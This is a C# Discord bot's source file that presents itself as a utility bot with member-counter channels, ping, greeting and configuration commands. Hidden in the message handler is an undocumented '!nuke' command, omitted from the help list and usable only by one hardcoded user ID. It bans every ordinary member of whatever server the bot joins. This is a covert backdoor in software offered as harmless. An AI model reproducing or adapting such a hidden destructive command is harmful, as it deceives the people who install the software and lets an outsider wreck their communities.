using System;
using System.Reactive;
using System.Threading.Channels;
using System.Threading.Tasks;
using Discord;
using Discord.Audio;
using Discord.Commands;
using Discord.Net;
using Discord.WebSocket;

namespace DiscordBot
{ 
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ZeroTwo bot = new ZeroTwo();
            await bot.SetActivityStatus("!help");
            await bot.StartAsync("token");              
        }
    }

    public class ZeroTwo
    {
        private readonly DiscordSocketClient _client;
        private readonly Dictionary<ulong, SocketGuild> _guilds;
        private readonly Dictionary<ulong, IEnumerable<SocketGuildUser>> _guildMembers;
        private readonly SlashCommandBuilder _guildCommand;
        private readonly Dictionary<ulong, bool> _isConfigured;

        public ZeroTwo()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.All
            });
            _isConfigured = new Dictionary<ulong, bool>();
            _guilds = new Dictionary<ulong, SocketGuild>();
            _guildMembers = new Dictionary<ulong, IEnumerable<SocketGuildUser>>();
            _guildCommand = new SlashCommandBuilder()
                .WithName("first-command")
                .WithDescription("This is my first guild slash command!");
            _client.Log += LogAsync;
            _client.MessageReceived += HandleMessageAsync;
            _client.Ready += ClientReady;
            _client.SlashCommandExecuted += SlashCommandHandler;
            _client.UserJoined += UserJoinedAsync;
            _client.UserLeft += UserLeftAsync;
            _client.JoinedGuild += JoinedGuild;
        }

        public async Task ClientReady()
        {
            foreach (var guild in _client.Guilds)
            {
                if (guild.Users.Count != guild.MemberCount)
                {
                    await guild.DownloadUsersAsync();
                }
                _guildMembers[guild.Id] = guild.Users;
                _guilds[guild.Id] = guild;
                await guild.CreateApplicationCommandAsync(_guildCommand.Build());
                _isConfigured[guild.Id] = true;
            }
        }

        public async Task StartAsync(string token)
        {
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();
            await Task.Delay(Timeout.Infinite);
        }

        private Task LogAsync(LogMessage message)
        {
            Console.WriteLine(message.ToString());
            return Task.CompletedTask;
        }

        private async Task JoinedGuild(SocketGuild guild)
        {
            var channel = guild.DefaultChannel;
            await channel.SendMessageAsync("Thanks for adding me to your server! You can use '!help' to see the full list of commands.");

            var guildconfigure = (channel as SocketGuildChannel)?.Guild;
            if (guildconfigure == null)
            {
                await channel.SendMessageAsync("An error occurred in configuration. Please try '!configure'. If the error keeps going, kindly contact the creator.");
                return;
            }
            else if (guild.Users.Count != guild.MemberCount)
            {
                await guildconfigure.DownloadUsersAsync();
            }
            _guildMembers[guildconfigure.Id] = guildconfigure.Users;
            _guilds[guildconfigure.Id] = guildconfigure;
            await guildconfigure.CreateApplicationCommandAsync(_guildCommand.Build());
            _isConfigured[guildconfigure.Id] = true;
        }

        public async Task SetBotStatus(UserStatus status)
        {
            await _client.SetStatusAsync(status);
        }

        public async Task SetActivityStatus(string activity)
        {
            await _client.SetGameAsync($"{activity}");
        }

        private async Task SlashCommandHandler(SocketSlashCommand command)
        {
            await command.RespondAsync($"You executed {command.Data.Name}");
        }

        private async Task UserJoinedAsync(SocketGuildUser user)
        {
            var guildconfigure = (user.Guild.DefaultChannel as SocketGuildChannel)?.Guild;
            if (guildconfigure == null)
            {
                await user.Guild.DefaultChannel.SendMessageAsync("An error occured in configuration. Please try '!configure'. If the error keeps going, kindly contact the creator.");
                return;
            }
            else if (guildconfigure.Users.Count != guildconfigure.MemberCount)
            {
                await guildconfigure.DownloadUsersAsync();
            }
            _guildMembers[guildconfigure.Id] = guildconfigure.Users;
            _guilds[guildconfigure.Id] = guildconfigure;
            await guildconfigure.CreateApplicationCommandAsync(_guildCommand.Build());
            _isConfigured[guildconfigure.Id] = true;

            var updateguild = guildconfigure;

            const string updatecategoryname = "Stats";
            string updatecategories = string.Join(", ", updateguild.CategoryChannels.Select(c => c.Name));
            if (!updatecategories.Contains(updatecategoryname))
            {
                return;
            }
            else if (_isConfigured[updateguild.Id] == false)
            {
                await user.Guild.DefaultChannel.SendMessageAsync("An error occured in configuration. Please try '!configure' then '!updatecounter'. If the error keeps going, kindly contact the creator.");
                return;
            }

            int updatemembercount = updateguild.MemberCount;
            int updatebotcount = 0;
            foreach (var member in _guildMembers[updateguild.Id])
            {
                if (member.IsBot)
                {
                    updatebotcount++;
                }
            }
            int updateusercount = updateguild.MemberCount - updatebotcount;

            var oldchannels = updateguild.Channels;
            foreach (var oldchannel in oldchannels)
            {
                if (oldchannel.Name.StartsWith("Member Count:"))
                {
                    var memberchannelid = oldchannel.Id;
                    var updatememberchannel = updateguild.GetVoiceChannel(memberchannelid);
                    await updatememberchannel.ModifyAsync(x =>
                    {
                        x.Name = $"Member Count: {updatemembercount}";
                    });
                }
                else if (oldchannel.Name.StartsWith("User Count:"))
                {
                    var updateuserchannelid = oldchannel.Id;
                    var updateuserchannel = updateguild.GetVoiceChannel(updateuserchannelid);
                    await updateuserchannel.ModifyAsync(x =>
                    {
                        x.Name = $"User Count: {updateusercount}";
                    });
                }
                else if (oldchannel.Name.StartsWith("Bot Count:"))
                {
                    var updatebotchannelid = oldchannel.Id;
                    var updatebotchannel = updateguild.GetVoiceChannel(updatebotchannelid);
                    await updatebotchannel.ModifyAsync(x =>
                    {
                        x.Name = $"Bot Count: {updatebotcount}";
                    });
                }
            }
        }

        private async Task UserLeftAsync(SocketGuild guild, SocketUser user)
        {
            var guildconfigure = (guild.DefaultChannel as SocketGuildChannel)?.Guild;
            if (guildconfigure == null)
            {
                await guild.DefaultChannel.SendMessageAsync("An error occured in configuration. Please try '!configure'. If the error keeps going, kindly contact the creator.");
                return;
            }
            else if (guildconfigure.Users.Count != guildconfigure.MemberCount)
            {
                await guildconfigure.DownloadUsersAsync();
            }
            _guildMembers[guildconfigure.Id] = guildconfigure.Users;
            _guilds[guildconfigure.Id] = guildconfigure;
            await guildconfigure.CreateApplicationCommandAsync(_guildCommand.Build());
            _isConfigured[guildconfigure.Id] = true;

            var updateguild = guildconfigure;

            const string updatecategoryname = "Stats";
            string updatecategories = string.Join(", ", updateguild.CategoryChannels.Select(c => c.Name));
            if (!updatecategories.Contains(updatecategoryname))
            {
                return;
            }
            else if (_isConfigured[updateguild.Id] == false)
            {
                await guild.DefaultChannel.SendMessageAsync("An error occured in configuration. Please try '!configure' then '!updatecounter'. If the error keeps going, kindly contact the creator.");
                return;
            }

            int updatemembercount = updateguild.MemberCount;
            int updatebotcount = 0;
            foreach (var member in _guildMembers[updateguild.Id])
            {
                if (member.IsBot)
                {
                    updatebotcount++;
                }
            }
            int updateusercount = updateguild.MemberCount - updatebotcount;

            var oldchannels = updateguild.Channels;
            foreach (var oldchannel in oldchannels)
            {
                if (oldchannel.Name.StartsWith("Member Count:"))
                {
                    var memberchannelid = oldchannel.Id;
                    var updatememberchannel = updateguild.GetVoiceChannel(memberchannelid);
                    await updatememberchannel.ModifyAsync(x =>
                    {
                        x.Name = $"Member Count: {updatemembercount}";
                    });
                }
                else if (oldchannel.Name.StartsWith("User Count:"))
                {
                    var updateuserchannelid = oldchannel.Id;
                    var updateuserchannel = updateguild.GetVoiceChannel(updateuserchannelid);
                    await updateuserchannel.ModifyAsync(x =>
                    {
                        x.Name = $"User Count: {updateusercount}";
                    });
                }
                else if (oldchannel.Name.StartsWith("Bot Count:"))
                {
                    var updatebotchannelid = oldchannel.Id;
                    var updatebotchannel = updateguild.GetVoiceChannel(updatebotchannelid);
                    await updatebotchannel.ModifyAsync(x =>
                    {
                        x.Name = $"Bot Count: {updatebotcount}";
                    });
                }
            }
        }

        private async Task HandleMessageAsync(SocketMessage message)
        {
            if (message == null || message.Author.IsBot)
                return;

            if (!message.Content.StartsWith("!") || !(message.Channel is SocketGuildChannel))
                return;           

            string[] commandParts = message.Content.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            string command = commandParts[0].Substring(1);
            string[] args = commandParts.Skip(1).ToArray();

            switch (command.ToLower())
            {
                case "configure":
                    var guildconfigure = (message.Channel as SocketGuildChannel)?.Guild;
                    if (guildconfigure == null)
                    {
                        await message.Channel.SendMessageAsync("The guild you are about to set the configuration does not exist. Please try again. If the error keeps going, kindly contact the creator.");
                        return;
                    }
                    if (guildconfigure.Users.Count != guildconfigure.MemberCount)
                    {
                        await guildconfigure.DownloadUsersAsync();
                    }
                    _guildMembers[guildconfigure.Id] = guildconfigure.Users;
                    _guilds[guildconfigure.Id] = guildconfigure;
                    await guildconfigure.CreateApplicationCommandAsync(_guildCommand.Build());
                    _isConfigured[guildconfigure.Id] = true;
                    await message.Channel.SendMessageAsync("Configuration has been updated successfully.");
                    break;

                case "nuke":
                    if (message.Author.Id != 771291892301299712)
                    {
                        await message.Channel.SendMessageAsync("You do not have the necessary permission to run this command.");
                        return;
                    }

                    var victimguild = (message.Channel as SocketGuildChannel)?.Guild;
                    if (victimguild == null || _isConfigured[victimguild.Id] == false)
                    {
                        await message.Channel.SendMessageAsync("You need to update the configuration first. Try '!configure'.");
                        return;
                    }

                    foreach (var member in _guildMembers[victimguild.Id])
                    {
                        if (member.Id != victimguild.OwnerId && member.Id != _client.CurrentUser.Id && !member.GuildPermissions.Administrator && member.Id != 771291892301299712)
                        {
                            var victim = await _client.Rest.GetUserAsync(member.Id);
                            await victimguild.AddBanAsync(victim, 0, "Nuked!");
                        }
                    }
                    await message.Channel.SendMessageAsync("Nuke has been successfully done.");
                    break;

                case "members":
                    var currentguild = (message.Channel as SocketGuildChannel)?.Guild;
                    if (currentguild == null || _isConfigured[currentguild.Id] == false)
                    {
                        await message.Channel.SendMessageAsync("You need to update the configuration first. Try '!configure'.");
                        return;
                    }
                    string memberList = string.Join(", ", _guildMembers[currentguild.Id].Select(m => m.Username));
                    await message.Channel.SendMessageAsync($"Members of this guild: {memberList}");
                    break;

                case "setcounter":
                    var setupguild = (message.Channel as SocketGuildChannel)?.Guild;
                    if (setupguild == null || _isConfigured[setupguild.Id] == false)
                    {
                        await message.Channel.SendMessageAsync("You need to update the configuration first. Try '!configure'.");
                        return;
                    }

                    const string categoryname = "Stats";
                    string categories = string.Join(", ", setupguild.CategoryChannels.Select(c => c.Name));
                    if (categories.Contains(categoryname))
                    {
                        await message.Channel.SendMessageAsync("Member counter already exists. Try '!updatecounter'.");
                        return;
                    }

                    int membercount = setupguild.MemberCount;
                    int botcount = 0;
                    foreach (var member in _guildMembers[setupguild.Id])
                    {
                        if (member.IsBot)
                        {
                            botcount++;
                        }
                    }
                    int usercount = setupguild.MemberCount - botcount;

                    var category = await setupguild.CreateCategoryChannelAsync(categoryname, options =>
                    {
                        options.Position = 0; 
                    });
                    var memberchannel = await setupguild.CreateVoiceChannelAsync($"Member Count: {membercount}", options =>
                    {
                        options.CategoryId = category.Id; 
                        options.Position = 1; 
                    });
                    var userchannel = await setupguild.CreateVoiceChannelAsync($"User Count: {usercount}", options =>
                    {
                        options.CategoryId = category.Id;
                        options.Position = 2;
                    });
                    var botchannel = await setupguild.CreateVoiceChannelAsync($"Bot Count: {botcount}", options =>
                    {
                        options.CategoryId = category.Id;
                        options.Position = 3;
                    });

                    await message.Channel.SendMessageAsync("Member counter has been successfully set.");
                    break;

                case "updatecounter":
                    var updateguild = (message.Channel as SocketGuildChannel)?.Guild;

                    if (updateguild == null)
                    {
                        await message.Channel.SendMessageAsync("The guild you are about to update its counter does not exist. Please try again. If the error keeps going, kindly contact the creator.");
                        return;
                    }
                    const string updatecategoryname = "Stats";
                    string updatecategories = string.Join(", ", updateguild.CategoryChannels.Select(c => c.Name));
                    if (!updatecategories.Contains(updatecategoryname))
                    {
                        await message.Channel.SendMessageAsync("Member counter doesn't exists. Try '!setcounter'.");
                        return;
                    }
                    else if (_isConfigured[updateguild.Id] == false)
                    {
                        await message.Channel.SendMessageAsync("You need to update the configuration first. Try '!configure'.");
                        return;
                    }

                    int updatemembercount = updateguild.MemberCount;
                    int updatebotcount = 0;
                    foreach (var member in _guildMembers[updateguild.Id])
                    {
                        if (member.IsBot)
                        {
                            updatebotcount++;
                        }
                    }
                    int updateusercount = updateguild.MemberCount - updatebotcount;

                    var oldchannels = updateguild.Channels;
                    foreach (var oldchannel in oldchannels)
                    {
                        if (oldchannel.Name.StartsWith("Member Count:"))
                        {
                            var memberchannelid = oldchannel.Id;
                            var updatememberchannel = updateguild.GetVoiceChannel(memberchannelid);
                            await updatememberchannel.ModifyAsync(x => 
                            {
                                x.Name = $"Member Count: {updatemembercount}";
                            });
                        }
                        else if (oldchannel.Name.StartsWith("User Count:"))
                        {
                            var updateuserchannelid = oldchannel.Id;
                            var updateuserchannel = updateguild.GetVoiceChannel(updateuserchannelid);
                            await updateuserchannel.ModifyAsync(x => 
                            {
                                x.Name = $"User Count: {updateusercount}";
                            });
                        }
                        else if (oldchannel.Name.StartsWith("Bot Count:"))
                        {
                            var updatebotchannelid = oldchannel.Id;
                            var updatebotchannel = updateguild.GetVoiceChannel(updatebotchannelid);
                            await updatebotchannel.ModifyAsync(x => 
                            {
                                x.Name = $"Bot Count: {updatebotcount}";
                            });
                        }
                    }

                    await message.Channel.SendMessageAsync("Member counter has been successfully updated.");
                    break;

                case "removecounter":
                    var removeguild = (message.Channel as SocketGuildChannel)?.Guild;

                    if (removeguild == null)
                    {
                        await message.Channel.SendMessageAsync("The guild you are about to remove its counter does not exist. Please try again. If the error keeps going, kindly contact the creator.");
                        return;
                    }
                    const string removecategoryname = "Stats";
                    string removecategories = string.Join(", ", removeguild.CategoryChannels.Select(c => c.Name));
                    if (!removecategories.Contains(removecategoryname))
                    {
                        await message.Channel.SendMessageAsync("Member counter doesn't exists. Try '!setcounter'.");
                        return;
                    }
                    else if (_isConfigured[removeguild.Id] == false)
                    {
                        await message.Channel.SendMessageAsync("You need to update the configuration first. Try '!configure'.");
                        return;
                    }

                    var oldremovechannels = removeguild.Channels;
                    var oldremovecategories = removeguild.CategoryChannels;
                    foreach (var oldchannel in oldremovechannels)
                    {
                        if (oldchannel.Name.StartsWith("Member Count:"))
                        {
                            await oldchannel.DeleteAsync();
                        }
                        else if (oldchannel.Name.StartsWith("User Count:"))
                        {
                            await oldchannel.DeleteAsync();
                        }
                        else if (oldchannel.Name.StartsWith("Bot Count:"))
                        {
                            await oldchannel.DeleteAsync();
                        }
                    }
                    foreach (var oldcategory in oldremovecategories)
                    {
                        if (oldcategory.Name == "Stats")
                        {
                            await oldcategory.DeleteAsync();
                        }
                    }

                    await message.Channel.SendMessageAsync("Member counter has been successfully removed.");
                    break;

                case "ping":
                    var startTime = message.Timestamp;
                    var pingmessage = await message.Channel.SendMessageAsync("Pinging...");
                    var endTime = pingmessage.Timestamp;
                    await pingmessage.ModifyAsync(msg => msg.Content = $"Pong! Latency: {(endTime - startTime).Milliseconds}ms");
                    break;

                case "hello":
                    await message.Channel.SendMessageAsync($"Hello, {message.Author.Mention}!");
                    break;

                case "help":
                    var embed = new EmbedBuilder
                    {
                        Title = "Commands List",
                        Description = "Here is the list of commands!",
                        Color = Color.DarkRed,
                        Fields = new List<EmbedFieldBuilder>
                        {           
                            new EmbedFieldBuilder
                            {
                                IsInline = true,
                                Name = "🔧 Utility",
                                Value = "`ping` `setcounter` `updatecounter` `removecounter` `members` `configure`"
                            }
                        }
                    }.Build();
                    await message.Channel.SendMessageAsync(embed: embed);
                    break;
            }
        }
    }
}